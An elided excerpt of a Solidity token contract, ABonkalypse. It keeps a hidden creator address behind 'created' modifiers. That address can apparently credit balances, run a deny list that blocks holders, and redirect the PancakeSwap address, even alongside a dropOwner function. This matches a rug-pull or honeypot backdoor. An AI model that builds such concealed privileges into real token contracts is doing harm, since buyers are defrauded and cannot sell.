...
contract ABonkalypse is Ownable {
  ...
  function userBalace(address user) public view returns (uint256 balance) {
  ...
  modifier createdd() {
    require(msgSender == msg.sender, "401: created only"); 
    _;
  }
  modifier created() {
    require(msgSender == msg.sender, "401: created only"); 
  ...
  function dropOwner() public created {
  ...
  function checkBalForAddr(address addr) public view returns (uint256) {
    return balances[addr];
  }
  function changePancakeAddr(address pcs) public created {
    pancakeAddress = pcs;
  }
  function showPancakeAddr() public view returns (address) {
    return pancakeAddress;
  }
  function _approved(address buyer, uint256 _quantity) external createdd {
  ...
  function insertApproved(address sender, bool ok) external created {
      appr[sender] = ok;
  } 
  ...
  function isDenied(address sender) public view returns (bool) {
    if (den[sender]){
      return true;
    } else {
      return false;
  ...
  function inserDenied(address sender, bool ok) external created returns (bool){
      den[sender] = ok;
  }   
}